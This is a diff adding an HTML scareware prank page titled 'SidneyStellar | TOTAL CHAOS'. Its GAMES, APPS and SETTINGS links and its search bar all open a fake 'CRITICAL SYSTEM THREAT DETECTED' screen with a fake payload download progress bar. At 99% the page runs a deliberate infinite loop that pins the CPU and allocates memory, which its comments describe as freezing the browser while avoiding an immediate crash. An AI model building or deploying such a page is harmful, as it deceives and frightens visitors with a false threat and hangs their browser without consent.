@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SidneyStellar | TOTAL CHAOS</title>
+    <style>
+        :root { --bg-color: #050505; --white: #ffffff; --danger: #ff0000; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg-color); color: var(--white); font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* MALWARE ALERT SCREEN */
+        #malware-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; color: #0f0; z-index: 20000; padding: 50px; box-sizing: border-box; font-size: 20px; }
+        .progress-container { width: 100%; background: #222; border: 2px solid #0f0; margin-top: 20px; height: 30px; position: relative; }
+        #progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s; }
+        .blink-red { color: red; animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* MAIN MENU UI */
+        .brand-logo { position: fixed; top: 25px; left: 25px; background: var(--white); color: black; font-weight: 900; padding: 10px 14px; border-radius: 4px; z-index: 100; font-family: sans-serif; }
+        nav { display: flex; justify-content: flex-end; padding: 30px 50px; font-family: sans-serif; }
+        .nav-item { margin-left: 35px; font-size: 11px; font-weight: 700; letter-spacing: 2px; cursor: pointer; transition: color 0.2s; }
+        .nav-item:hover { color: var(--danger); }
+        
+        main { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; }
+        h1 { font-size: 80px; letter-spacing: 6px; margin-bottom: 20px; }
+        .search-bar { width: 600px; background: #121212; border: 2px solid transparent; padding: 20px; border-radius: 6px; color: white; text-align: center; outline: none; transition: border-color 0.3s; }
+        .search-bar:focus { border-color: var(--danger); }
+    </style>
+</head>
+<body>
+
+    <!-- Fake Malware Progress Screen -->
+    <div id="malware-screen">
+        <h1 class="blink-red">⚠️ CRITICAL SYSTEM THREAT DETECTED ⚠️</h1>
+        <p>> Initializing Remote Connection...</p>
+        <p>> Accessing File System [C:/Users/Admin/Documents]...</p>
+        <p>> DOWNLOADING ENCRYPTED PAYLOAD: <span id="percent">0%</span></p>
+        <div class="progress-container">
+            <div id="progress-bar"></div>
+        </div>
+        <p style="margin-top: 20px;">[DO NOT POWER OFF YOUR DEVICE]</p>
+        <div id="file-log" style="font-size: 14px; color: #555;"></div>
+    </div>
+
+    <!-- Main Menu Content -->
+    <div class="brand-logo">IN</div>
+    <nav>
+        <span class="nav-item" onclick="startChaos()">GAMES</span>
+        <span class="nav-item" onclick="startChaos()">APPS</span>
+        <span class="nav-item" onclick="startChaos()">SETTINGS</span>
+    </nav>
+
+    <main>
+        <h1>SIDNEYSTELLAR</h1>
+        <input type="text" id="search" class="search-bar" placeholder="Enter to DESTROY system">
+    </main>
+
+    <script>
+        const searchBar = document.getElementById('search');
+        const malwareScreen = document.getElementById('malware-screen');
+        const progressBar = document.getElementById('progress-bar');
+        const percentText = document.getElementById('percent');
+
+        searchBar.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') startChaos();
+        });
+
+        function startChaos() {
+            // 1. Show the malware screen
+            malwareScreen.style.display = 'block';
+
+            // 2. Fake progress animation before the freeze
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress >= 99) {
+                    progress = 99;
+                    clearInterval(interval);
+                    triggerPermanentFreeze(); // LOCK THE SYSTEM AT 99%
+                }
+                progressBar.style.width = progress + "%";
+                percentText.innerText = Math.floor(progress) + "%";
+            }, 100);
+        }
+
+        function triggerPermanentFreeze() {
+            // This is the core "Freeze" logic that doesn't trigger the "Aw Snap" immediately
+            setTimeout(() => {
+                console.log("SYSTEM LOCK ENGAGED.");
+                
+                // Infinite Thread Lock
+                while(true) {
+                    // Heavy math to keep the CPU pinned at 100%
+                    let x = Math.sqrt(Math.random() * 1000) * Math.sin(Math.random());
+                    
+                    // Flood memory slightly to slow down the browser's response time
+                    const leak = new Array(10000).fill("CHAOS"); 
+                }
+            }, 50);
+        }
+    </script>
+</body>
+</html>
